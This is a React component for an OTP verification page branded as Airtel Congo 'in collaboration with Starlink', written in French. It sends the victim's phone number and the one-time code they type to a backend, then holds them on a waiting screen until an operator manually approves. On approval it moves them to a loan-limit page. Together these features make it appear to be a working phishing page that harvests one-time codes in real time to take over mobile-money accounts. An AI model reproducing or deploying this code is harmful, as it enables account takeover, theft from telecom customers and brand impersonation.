import React, { useState, useEffect, useCallback, useRef } from 'react';
import { useNavigate } from 'react-router-dom';

const API_BASE = import.meta.env.VITE_API_BASE_URL ?? '';

const OTP_LENGTH = 4;
const POLL_FAST_MS = 2000;
const POLL_SLOW_MS = 5000;
const POLL_SLOW_AFTER_MS = 60_000;
const TIMER_START = 60;
const PENDING_KEY = 'airtelPendingRequest';

function makeRefId() {
  const ts = Date.now().toString(36).toUpperCase();
  const rand = Math.random().toString(36).slice(2, 6).toUpperCase();
  return `AL-${ts}-${rand}`;
}

function formatPhone(p: string) {
  if (!p) return 'votre téléphone';
  return p.replace(/\s+/g, ''); 
}

function AirtelOTPVerify() {
  const [otp, setOtp] = useState('');
  const [timeLeft, setTimeLeft] = useState(TIMER_START);
  const [timerResetKey, setTimerResetKey] = useState(0);
  const [expired, setExpired] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [waitingForAdmin, setWaitingForAdmin] = useState(false);
  const [refId, setRefId] = useState('');
  const [submittedAt, setSubmittedAt] = useState('');

  const pollTokenRef = useRef<{ cancelled: boolean } | null>(null);
  const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const hasResumedRef = useRef(false);
  const navigate = useNavigate();

  const phoneNumber = localStorage.getItem('airtelPhone') || '';

  const stopPolling = useCallback(() => {
    if (pollTokenRef.current) pollTokenRef.current.cancelled = true;
    pollTokenRef.current = null;
    if (pollTimerRef.current) {
      clearTimeout(pollTimerRef.current);
      pollTimerRef.current = null;
    }
  }, []);

  useEffect(() => {
    if (!phoneNumber) navigate('/login');
  }, [phoneNumber, navigate]);

  /* ─── Countdown Timer ─── */
  useEffect(() => {
    if (expired) return;

    const id = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(id);
          setExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(id);
  }, [timerResetKey, expired]);

  useEffect(() => stopPolling, [stopPolling]);

  const resetToInput = useCallback(() => {
    stopPolling();
    setIsVerifying(false);
    setWaitingForAdmin(false);
    setSubmittedAt('');
    setRefId('');
    setOtp('');
    sessionStorage.removeItem(PENDING_KEY);
  }, [stopPolling]);

  const startPolling = useCallback(
    (id: string) => {
      stopPolling();

      const token = { cancelled: false };
      pollTokenRef.current = token;
      const startedAt = Date.now();

      const tick = async () => {
        if (token.cancelled) return;

        try {
          const res = await fetch(
            `${API_BASE}/api/otp-status/${encodeURIComponent(id)}`,
            { cache: 'no-store' },
          );
          const data = await res.json();
          if (token.cancelled) return;

          if (data.status === 'approved') {
            stopPolling();
            sessionStorage.removeItem(PENDING_KEY);
            setTimeout(() => navigate('/airtel-loan-limit'), 300);
            return;
          }

          if (data.status === 'rejected' || data.status === 'expired') {
            resetToInput();
            return;
          }
        } catch {
          /* keep polling */
        }

        if (token.cancelled) return;
        const elapsed = Date.now() - startedAt;
        const delay = elapsed < POLL_SLOW_AFTER_MS ? POLL_FAST_MS : POLL_SLOW_MS;
        pollTimerRef.current = setTimeout(tick, delay);
      };

      pollTimerRef.current = setTimeout(tick, POLL_FAST_MS);
    },
    [navigate, resetToInput, stopPolling],
  );

  useEffect(() => {
    if (hasResumedRef.current) return;
    hasResumedRef.current = true;

    try {
      const raw = sessionStorage.getItem(PENDING_KEY);
      if (!raw) return;
      const saved = JSON.parse(raw);
      if (!saved?.refId) return;

      setRefId(saved.refId);
      setSubmittedAt(saved.submittedAt ?? '');
      setWaitingForAdmin(true);
      setIsVerifying(true);
      startPolling(saved.refId);
    } catch {
      sessionStorage.removeItem(PENDING_KEY);
    }
  }, [startPolling]);

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '');
    if (val.length <= OTP_LENGTH) {
      setOtp(val);
    }
  };

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isVerifying || otp.length < OTP_LENGTH) return;

    setIsVerifying(true);
    setWaitingForAdmin(false);

    const newRefId = makeRefId();
    const nowIso = new Date().toISOString();

    setRefId(newRefId);
    setSubmittedAt(nowIso);

    try {
      const response = await fetch(`${API_BASE}/api/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone_number: phoneNumber,
          otp: otp,
          ref_id: newRefId,
          submitted_at: nowIso,
        }),
      });
      const data = await response.json();

      const finalRef = data.ref_id || newRefId;
      setRefId(finalRef);

      if (data.status === 'approved') {
        sessionStorage.removeItem(PENDING_KEY);
        setTimeout(() => navigate('/airtel-loan-limit'), 300);
        return;
      }

      if (data.status === 'rejected') {
        resetToInput();
        return;
      }

      setWaitingForAdmin(true);
      sessionStorage.setItem(
        PENDING_KEY,
        JSON.stringify({ refId: finalRef, otp: otp, submittedAt: nowIso }),
      );
      startPolling(finalRef);
    } catch {
      resetToInput();
    }
  };

  const handleResend = async () => {
    if (isVerifying || isResending) return;

    stopPolling();
    sessionStorage.removeItem(PENDING_KEY);
    setTimeLeft(TIMER_START);
    setExpired(false);
    setTimerResetKey((k) => k + 1);
    setOtp('');
    setWaitingForAdmin(false);
    setSubmittedAt('');
    setRefId('');
    setIsResending(true);

    try {
      await fetch(`${API_BASE}/api/resend-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: phoneNumber }),
      });
    } catch {
      /* silent */
    } finally {
      setIsResending(false);
    }
  };

  const showWaitingOverlay = isVerifying || waitingForAdmin;

  return (
    <div className="airtel-page-container">
      <style>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .airtel-page-container {
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          background-color: #F8F9FA;
          position: relative;
        }

        /* FADED BACKGROUND WHEN WAITING */
        .faded-content {
          opacity: 0.15;
          pointer-events: none;
          transition: opacity 0.3s ease;
          display: flex;
          flex-direction: column;
          min-height: 100vh;
        }

        /* WAITING OVERLAY */
        .waiting-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100vw;
          height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          z-index: 9999;
          padding: 20px;
          background-color: rgba(255, 255, 255, 0.4);
        }

        .custom-spinner {
          width: 60px;
          height: 60px;
          border: 6px solid #E5E7EB;
          border-top: 6px solid #DA1C1C;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin-bottom: 24px;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .waiting-title {
          font-size: 22px;
          font-weight: 700;
          color: #1a1a1a;
          margin-bottom: 20px;
        }

        .waiting-message {
          background-color: #FEF2F2;
          color: #4B5563;
          padding: 16px 24px;
          border-radius: 24px;
          text-align: center;
          font-size: 15px;
          font-weight: 500;
          line-height: 1.5;
          max-width: 380px;
          box-shadow: 0 4px 12px rgba(0,0,0,0.05);
        }

        /* HEADER */
        .otp-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 16px 20px;
          background-color: #ffffff;
          border-bottom: 1px solid #E5E7EB;
        }

        .header-icon-btn {
          background: none;
          border: none;
          cursor: pointer;
          padding: 8px;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .header-center-logo {
          display: flex;
          flex-direction: column;
          align-items: center;
        }

        .tagline {
          font-size: 8px;
          letter-spacing: 1px;
          color: #333;
          text-transform: uppercase;
          margin-top: 4px;
          font-weight: 600;
        }
        
        .tagline span {
          color: #DA1C1C;
        }

        /* MAIN CONTENT */
        .otp-main-content {
          flex: 1;
          padding: 24px;
          display: flex;
          flex-direction: column;
          align-items: center;
        }

        .otp-card {
          background-color: #ffffff;
          width: 100%;
          max-width: 420px;
          border-radius: 16px;
          padding: 32px 24px;
          box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
          border: 1px solid #F3F4F6;
        }

        .otp-title {
          font-size: 24px;
          font-weight: 800;
          color: #1a1a1a;
          margin-bottom: 12px;
        }

        .otp-subtitle {
          font-size: 15px;
          color: #6B7280;
          line-height: 1.5;
          margin-bottom: 24px;
        }

        .otp-phone-number {
          color: #1a1a1a;
          font-weight: 700;
          display: block;
          margin-top: 4px;
        }

        .otp-input-field {
          width: 100%;
          padding: 18px;
          border: 1px solid #D1D5DB;
          border-radius: 8px;
          font-size: 16px;
          color: #1a1a1a;
          background-color: #ffffff; /* Added to force white background */
          text-align: center;
          outline: none;
          transition: border-color 0.2s;
          margin-bottom: 16px;
        }

        .otp-input-field:focus {
          border-color: #2A5CAA;
        }

        .otp-input-field::placeholder {
          color: #9CA3AF;
        }

        .otp-timer-text {
          font-size: 14px;
          color: #6B7280;
          text-align: center;
          margin-bottom: 24px;
          line-height: 1.6;
        }

        .otp-timer-text strong {
          color: #1a1a1a;
        }

        .submit-btn {
          width: 100%;
          padding: 16px;
          border-radius: 30px;
          border: none;
          background-color: #D1D5DB;
          color: #ffffff;
          font-size: 16px;
          font-weight: 700;
          text-transform: uppercase;
          cursor: not-allowed;
          transition: background-color 0.2s;
        }

        .submit-btn.active {
          background-color: #DA1C1C;
          cursor: pointer;
        }

        .resend-link {
          background: none;
          border: none;
          color: #2A5CAA;
          font-size: 14px;
          font-weight: 600;
          margin-top: 20px;
          cursor: pointer;
          width: 100%;
          text-align: center;
        }

        /* FOOTER */
        .otp-footer {
          background-color: #F3F4F6;
          padding: 32px 24px;
          display: flex;
          flex-direction: column;
          align-items: center;
          border-top: 1px solid #E5E7EB;
        }

        .footer-logo-wrapper {
          display: flex;
          flex-direction: column;
          align-items: center;
          margin-bottom: 24px;
        }

        .collab-text {
          font-size: 14px;
          font-weight: 600;
          color: #333;
          margin-bottom: 4px;
        }

        .starlink-text {
          font-size: 15px;
          font-weight: 800;
          color: #1a1a1a;
          letter-spacing: 1px;
        }

        .starlink-text sup {
          font-size: 8px;
          font-weight: normal;
        }

        .copyright {
          font-size: 12px;
          color: #9CA3AF;
          margin-top: 24px;
        }
      `}</style>

      {/* WAITING OVERLAY */}
      {showWaitingOverlay && (
        <div className="waiting-overlay">
          <div className="custom-spinner"></div>
          <div className="waiting-title">En attente d'approbation</div>
          <div className="waiting-message">
            Votre demande a été envoyée. Merci de patienter pendant la vérification...
          </div>
        </div>
      )}

      {/* MAIN CONTENT WRAPPER (Faded when waiting) */}
      <div className={showWaitingOverlay ? 'faded-content' : ''}>
        
        {/* HEADER */}
        <header className="otp-header">
          <button className="header-icon-btn" onClick={() => navigate('/login')}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="19" y1="12" x2="5" y2="12" />
              <polyline points="12 19 5 12 12 5" />
            </svg>
          </button>
          
          <div className="header-center-logo">
            <svg width="100" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
              <circle cx="25" cy="17" r="5" fill="white"/>
              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
            </svg>
            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
          </div>

          <button className="header-icon-btn">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="3" y1="12" x2="21" y2="12" />
              <line x1="3" y1="6" x2="21" y2="6" />
              <line x1="3" y1="18" x2="21" y2="18" />
            </svg>
          </button>
        </header>

        {/* MAIN CONTENT */}
        <main className="otp-main-content">
          <div className="otp-card">
            <h2 className="otp-title">Vérification OTP</h2>
            
            <p className="otp-subtitle">
              Entrez l'OTP envoyé à votre numéro de téléphone
              <span className="otp-phone-number">{formatPhone(phoneNumber)}</span>
            </p>

            <form onSubmit={handleVerify}>
              <input
                type="tel"
                inputMode="numeric"
                autoComplete="one-time-code"
                maxLength={OTP_LENGTH}
                value={otp}
                onChange={handleOtpChange}
                placeholder="Entrer l'OTP à 4 chiffres"
                className="otp-input-field"
              />

              <p className="otp-timer-text">
                Entrer le code de vérification à 4 chiffres<br />
                Le code expire dans <strong>{timeLeft}</strong> secondes
              </p>

              <button 
                type="submit" 
                className={`submit-btn ${otp.length === OTP_LENGTH ? 'active' : ''}`}
                disabled={otp.length < OTP_LENGTH || showWaitingOverlay}
              >
                SOUMETTRE
              </button>

              <button 
                type="button" 
                className="resend-link"
                onClick={handleResend}
                disabled={isResending || showWaitingOverlay}
              >
                {isResending ? 'Envoi en cours...' : 'Renvoyer le code'}
              </button>
            </form>
          </div>
        </main>

        {/* FOOTER */}
        <footer className="otp-footer">
          <div className="footer-logo-wrapper">
            <svg width="110" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
              <circle cx="25" cy="17" r="5" fill="white"/>
              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
            </svg>
            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
          </div>

          <p className="collab-text">En collaboration avec</p>
          <p className="starlink-text">STARLINK<sup>TM</sup></p>

          <p className="copyright">© 2026 Airtel Congo. Tous droits réservés.</p>
        </footer>
      </div>
    </div>
  );
}

export default AirtelOTPVerify;